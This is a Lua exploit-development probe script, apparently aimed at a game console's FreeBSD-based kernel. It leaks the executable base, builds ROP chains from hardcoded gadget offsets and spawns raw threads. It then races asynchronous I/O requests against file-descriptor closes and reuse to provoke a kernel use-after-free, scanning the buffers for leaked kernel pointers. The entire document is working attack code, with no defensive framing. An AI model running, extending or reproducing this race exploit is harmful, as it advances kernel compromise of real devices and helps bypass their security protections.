-- CRASH_CLASS: MODERATE
-- PROBE 353b: AIO fd-close race — UAF attempt
--
-- 353a confirmed: AIO read from empty socketpair is ASYNC (state=0x2 pending).
-- The kernel holds a reference to the file object while the operation is pending.
--
-- Attack: submit AIO READ on socket fd → operation is PENDING (state=0x2) →
-- child thread closes fd → kernel's AIO completion path may reference freed file.
--
-- If the kernel takes an extra fhold()/fdrop() ref on submit, the close
-- won't free it (safe). If it only holds the fd NUMBER (not a ref), closing
-- the fd frees the file object → UAF when AIO tries to complete.
--
-- This is the exact pattern of Relapse's aio_multi_wait UAF on 14.00.
-- We test: close fd, then feed data to trigger completion → observe behavior.

print("=== PROBE 353b: AIO FD-CLOSE RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa = syscall.syscall_address

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

local G = {
    ret      = 0x42,
    pop_rax  = 0x992,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    mov_w    = 0x92C67,
    jmp_loop = 0x15481,
}

local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)

-- Ignore signals
local sc_sigaction = mk(416)
local act_buf = memory.alloc(0x40)
for off = 0, 0x3C, 4 do wd(N(act_buf) + off, 0) end
for sig = 1, 31 do
    if sig ~= 9 then
        wq(N(act_buf), uint64(1)); wd(N(act_buf) + 8, 0)
        pcall(function() sc_sigaction(uint64(sig), act_buf, uint64(0), uint64(0), uint64(0), uint64(0)) end)
    end
end
print("signals ignored")

-- Thread infrastructure
local stk = memory.alloc(0x10000)
local ctx = memory.alloc(0x500)
local tid_buf = memory.alloc(8)

local function cp(base, p, val)
    wq(base + p, val)
    return p + 8
end

local function spawn(chain_base)
    local BC = N(ctx)
    for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
    wd(BC + 0x108, 0x480); wd(BC + 0xD0, 0)
    wd(BC + 0x110, 0x10000)
    wd(BC + 0xC0, 0x43); wd(BC + 0x100, 0x3B)
    wd(BC + 0xE0, rip_lo); wd(BC + 0xE4, rip_hi)
    local rsp_lo = chain_base % 0x100000000
    local rsp_hi = math.floor(chain_base / 0x100000000)
    wd(BC + 0xF8, rsp_lo); wd(BC + 0xFC, rsp_hi)
    wq(N(tid_buf), uint64("0x0"))
    pcall(function() mk(430)(ctx, tid_buf, uint64(0)) end)
    return rq(N(tid_buf))
end

local sc_socketpair = mk(135)
local sc_close = mk(6)
local sc_write = mk(4)
local sc_submit = mk(669)
local sc_poll = mk(664)
local sc_delete = mk(662)

-- Shared state
local shared = memory.alloc(0x400)
local CLOSE_DONE = N(shared) + 0x00
local CHILD_EXIT = N(shared) + 0x08

-- AIO buffers
local reqs = memory.alloc(0x100)
local data_buf = memory.alloc(0x4000)
local result_buf = memory.alloc(0x100)
local ids_buf = memory.alloc(0x100)

local function zero_aio()
    for off = 0, 0x3F, 4 do
        wd(N(reqs) + off, 0)
        wd(N(result_buf) + off, 0)
        wd(N(ids_buf) + off, 0)
    end
    for off = 0, 0xFF, 4 do wd(N(data_buf) + off, 0) end
end

local function fill_req(len, fd)
    local base = N(reqs)
    wq(base + 0x00, uint64(0))
    wq(base + 0x08, uint64(len))
    wq(base + 0x10, data_buf)
    wq(base + 0x18, result_buf)
    wd(base + 0x20, fd)
    wd(base + 0x24, 0)
end

-- Timespec for child nanosleep
local ts_1ms = memory.alloc(16)
wq(N(ts_1ms), uint64(0))
wq(N(ts_1ms) + 8, uint64(1000000))  -- 1ms

-- ============ CONTROL: Normal async flow (no race) ============
print("")
print("[0] Control: normal async socketpair AIO")
local sv = memory.alloc(16)
wd(N(sv), 0); wd(N(sv) + 4, 0)
pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), sv) end)
local ctl_fd0 = rd(N(sv)) or -1
local ctl_fd1 = rd(N(sv) + 4) or -1
print(string.format("  socketpair fd0=%d fd1=%d", ctl_fd0, ctl_fd1))

if ctl_fd0 >= 0 and ctl_fd0 < 0x10000 then
    zero_aio()
    fill_req(16, ctl_fd0)
    local ret = nil
    pcall(function()
        ret = sc_submit(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(ids_buf)))
    end)
    local id = rd(N(ids_buf)) or 0
    local res = rd(N(result_buf)) or 0
    print(string.format("  submit=%s id=0x%X result=0x%08X", ret and tostring(sgn(ret)) or "exc", id, res))

    -- Poll: should be pending
    local st_buf = memory.alloc(0x40)
    wd(N(st_buf), 0)
    wd(N(ids_buf), id)
    pcall(function() sc_poll(uint64(N(ids_buf)), uint64(1), uint64(N(st_buf))) end)
    local st = rd(N(st_buf)) or 0
    print(string.format("  poll state=0x%X (expect 0x2=pending)", st))

    -- Feed data, complete
    local wbuf = memory.alloc(16)
    for i = 0, 3 do wd(N(wbuf) + i * 4, 0xAAAAAAAA) end
    pcall(function() sc_write(uint64(ctl_fd1), wbuf, uint64(16)) end)

    wd(N(st_buf), 0)
    wd(N(ids_buf), id)
    pcall(function() sc_poll(uint64(N(ids_buf)), uint64(1), uint64(N(st_buf))) end)
    st = rd(N(st_buf)) or 0
    res = rd(N(result_buf)) or 0
    local d0 = rd(N(data_buf)) or 0
    print(string.format("  after write: state=0x%X result=0x%08X data=0x%08X", st, res, d0))
    pcall(function() sc_delete(uint64(N(ids_buf)), uint64(1), uint64(N(st_buf))) end)
    pcall(function() sc_close(uint64(ctl_fd0)) end)
    pcall(function() sc_close(uint64(ctl_fd1)) end)
end

-- ============ RACE 1: Main submits AIO, child closes fd ============
print("")
print("[1] RACE: submit AIO read → child closes socket fd")

local total_kptr = 0
local total_anomaly = 0

for round = 1, 5 do
    if not alive() then print(string.format("  R%d: DEAD!", round)); break end

    -- Fresh socketpair each round
    wd(N(sv), 0); wd(N(sv) + 4, 0)
    pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1
    local fd1 = rd(N(sv) + 4) or -1
    if fd0 < 0 or fd0 >= 0x10000 then
        print(string.format("  R%d: socketpair failed", round))
        break
    end

    -- Reset shared state
    wd(CLOSE_DONE, 0)
    wq(CHILD_EXIT, uint64(0))

    -- Submit AIO read on fd0 (empty socket → PENDING)
    zero_aio()
    fill_req(16, fd0)
    local ret = nil
    pcall(function()
        ret = sc_submit(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(ids_buf)))
    end)
    local id = rd(N(ids_buf)) or 0
    local res0 = rd(N(result_buf)) or 0

    -- Verify pending
    local st_buf2 = memory.alloc(0x40)
    wd(N(st_buf2), 0)
    wd(N(ids_buf), id)
    pcall(function() sc_poll(uint64(N(ids_buf)), uint64(1), uint64(N(st_buf2))) end)
    local pre_state = rd(N(st_buf2)) or 0

    -- Build child chain: close(fd0) → sentinel → thr_exit
    local CC = N(stk) + 0x2000
    local p = 0
    -- close(fd0)
    p = cp(CC, p, eaddr(G.pop_rax)); p = cp(CC, p, uint64(6))    -- sys close
    p = cp(CC, p, eaddr(G.pop_rdi)); p = cp(CC, p, uint64(fd0))
    p = cp(CC, p, sa)
    -- store close result
    p = cp(CC, p, eaddr(G.pop_rdi)); p = cp(CC, p, uint64(string.format("0x%X", CLOSE_DONE)))
    p = cp(CC, p, eaddr(G.mov_w))                                 -- [CLOSE_DONE] = rax (close ret)
    -- nanosleep 1ms
    p = cp(CC, p, eaddr(G.pop_rax)); p = cp(CC, p, uint64(240))
    p = cp(CC, p, eaddr(G.pop_rdi)); p = cp(CC, p, uint64(string.format("0x%X", N(ts_1ms))))
    p = cp(CC, p, eaddr(G.pop_rsi)); p = cp(CC, p, uint64(0))
    p = cp(CC, p, sa)
    -- thr_exit
    p = cp(CC, p, eaddr(G.pop_rax)); p = cp(CC, p, uint64(431))
    p = cp(CC, p, eaddr(G.pop_rdi)); p = cp(CC, p, uint64(string.format("0x%X", CHILD_EXIT)))
    p = cp(CC, p, sa)

    spawn(CC)

    -- Wait for child to close fd
    for i = 1, 100000 do
        if (rd(CLOSE_DONE) or 0) ~= 0 then break end
        if i % 1000 == 0 then native.fcall_with_rax(stub, 20) end
    end
    local close_ret = rd(CLOSE_DONE) or 0

    -- NOW: AIO is pending on a CLOSED fd. Write data to fd1 to trigger completion.
    local wbuf3 = memory.alloc(16)
    for i = 0, 3 do wd(N(wbuf3) + i * 4, 0xBBBBBBBB) end
    local wret = nil
    pcall(function() wret = sc_write(uint64(fd1), wbuf3, uint64(16)) end)

    -- Small delay for completion
    pcall(function() mk(240)(ts_1ms, uint64(0)) end)

    -- Poll AIO state after close
    wd(N(st_buf2), 0)
    wd(N(ids_buf), id)
    pcall(function() sc_poll(uint64(N(ids_buf)), uint64(1), uint64(N(st_buf2))) end)
    local post_state = rd(N(st_buf2)) or 0
    local post_res = rd(N(result_buf)) or 0
    local post_data = rd(N(data_buf)) or 0

    -- Scan for kernel pointers in data and result buffers
    local kptr_found = 0
    for off = 0, 0xFF, 4 do
        local q = rq(N(data_buf) + off)
        if q then
            local h = 0
            if type(q) == "table" and q.h then h = q.h end
            if h < 0 then h = h + 0x100000000 end
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("  *** KPTR data+0x%X: %s ***", off, fmt(q)))
                kptr_found = kptr_found + 1
            end
        end
    end
    for off = 0, 0x3F, 4 do
        local q = rq(N(result_buf) + off)
        if q then
            local h = 0
            if type(q) == "table" and q.h then h = q.h end
            if h < 0 then h = h + 0x100000000 end
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("  *** KPTR result+0x%X: %s ***", off, fmt(q)))
                kptr_found = kptr_found + 1
            end
        end
    end

    total_kptr = total_kptr + kptr_found

    local anomaly = (pre_state ~= 2) or (close_ret == 0 and post_state == 3 and post_data == 0xBBBBBBBB)
    if anomaly then total_anomaly = total_anomaly + 1 end

    print(string.format("  R%d: pre_st=0x%X close_ret=0x%X post_st=0x%X result=0x%08X data=0x%08X write=%s kptr=%d %s",
        round, pre_state, close_ret, post_state, post_res, post_data,
        wret and tostring(sgn(wret)) or "exc", kptr_found,
        anomaly and "ANOMALY" or ""))

    -- Try to delete the AIO request
    wd(N(st_buf2), 0)
    wd(N(ids_buf), id)
    local dret = nil
    pcall(function() dret = sc_delete(uint64(N(ids_buf)), uint64(1), uint64(N(st_buf2))) end)

    -- Wait for child exit, close remaining fd
    for i = 1, 50000 do
        if N(rq(CHILD_EXIT) or 0) ~= 0 then break end
        if i % 1000 == 0 then native.fcall_with_rax(stub, 20) end
    end
    pcall(function() sc_close(uint64(fd1)) end)
end

-- ============ RACE 2: AIO pending → close BOTH fds ============
print("")
print("[2] RACE: AIO pending → close BOTH socket fds (no completion trigger)")

for round = 1, 5 do
    if not alive() then print(string.format("  R%d: DEAD!", round)); break end

    wd(N(sv), 0); wd(N(sv) + 4, 0)
    pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1
    local fd1 = rd(N(sv) + 4) or -1
    if fd0 < 0 or fd0 >= 0x10000 then
        print(string.format("  R%d: socketpair failed", round))
        break
    end

    zero_aio()
    fill_req(16, fd0)
    local ret = nil
    pcall(function()
        ret = sc_submit(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(ids_buf)))
    end)
    local id = rd(N(ids_buf)) or 0

    -- Close both ends immediately from main thread
    pcall(function() sc_close(uint64(fd0)) end)
    pcall(function() sc_close(uint64(fd1)) end)

    -- Small delay
    pcall(function() mk(240)(ts_1ms, uint64(0)) end)

    -- Poll
    local st3 = memory.alloc(0x40)
    wd(N(st3), 0)
    wd(N(ids_buf), id)
    pcall(function() sc_poll(uint64(N(ids_buf)), uint64(1), uint64(N(st3))) end)
    local state = rd(N(st3)) or 0
    local res = rd(N(result_buf)) or 0

    -- Scan for kptrs
    local kp = 0
    for off = 0, 0xFF, 4 do
        local q = rq(N(data_buf) + off)
        if q then
            local h = 0
            if type(q) == "table" and q.h then h = q.h end
            if h < 0 then h = h + 0x100000000 end
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("  *** KPTR data+0x%X: %s ***", off, fmt(q)))
                kp = kp + 1
            end
        end
    end
    total_kptr = total_kptr + kp

    print(string.format("  R%d: state=0x%X result=0x%08X kptr=%d", round, state, res, kp))

    pcall(function() sc_delete(uint64(N(ids_buf)), uint64(1), uint64(N(st3))) end)
end

-- ============ RACE 3: Multiple pending AIO, close fd, reopen new fd on same number ============
print("")
print("[3] RACE: AIO pending → close → reopen (fd reuse)")

for round = 1, 3 do
    if not alive() then print(string.format("  R%d: DEAD!", round)); break end

    -- Create socketpair for AIO
    wd(N(sv), 0); wd(N(sv) + 4, 0)
    pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1
    local fd1 = rd(N(sv) + 4) or -1
    if fd0 < 0 or fd0 >= 0x10000 then
        print(string.format("  R%d: socketpair failed", round))
        break
    end

    -- Submit AIO on fd0 → pending
    zero_aio()
    fill_req(16, fd0)
    local ret = nil
    pcall(function()
        ret = sc_submit(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(ids_buf)))
    end)
    local id = rd(N(ids_buf)) or 0

    -- Close fd0
    pcall(function() sc_close(uint64(fd0)) end)

    -- Reopen a new socketpair — if fd0 is reused, AIO might operate on the new object
    local sv2 = memory.alloc(16)
    wd(N(sv2), 0); wd(N(sv2) + 4, 0)
    pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), sv2) end)
    local new_fd0 = rd(N(sv2)) or -1
    local new_fd1 = rd(N(sv2) + 4) or -1

    -- Write data to ORIGINAL fd1 (if AIO still holds ref, data arrives)
    local wbuf4 = memory.alloc(16)
    for i = 0, 3 do wd(N(wbuf4) + i * 4, 0x41414141) end
    local wret = nil
    pcall(function() wret = sc_write(uint64(fd1), wbuf4, uint64(16)) end)

    pcall(function() mk(240)(ts_1ms, uint64(0)) end)

    -- Poll AIO
    local st4 = memory.alloc(0x40)
    wd(N(st4), 0)
    wd(N(ids_buf), id)
    pcall(function() sc_poll(uint64(N(ids_buf)), uint64(1), uint64(N(st4))) end)
    local state = rd(N(st4)) or 0
    local res = rd(N(result_buf)) or 0
    local d0 = rd(N(data_buf)) or 0

    print(string.format("  R%d: new_fds=%d,%d state=0x%X result=0x%08X data=0x%08X wret=%s",
        round, new_fd0, new_fd1, state, res, d0,
        wret and tostring(sgn(wret)) or "exc"))

    pcall(function() sc_delete(uint64(N(ids_buf)), uint64(1), uint64(N(st4))) end)
    pcall(function() sc_close(uint64(fd1)) end)
    pcall(function() sc_close(uint64(new_fd0)) end)
    pcall(function() sc_close(uint64(new_fd1)) end)
end

print("")
print(string.format("TOTAL: anomalies=%d kptr=%d", total_anomaly, total_kptr))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 353b COMPLETE ===")
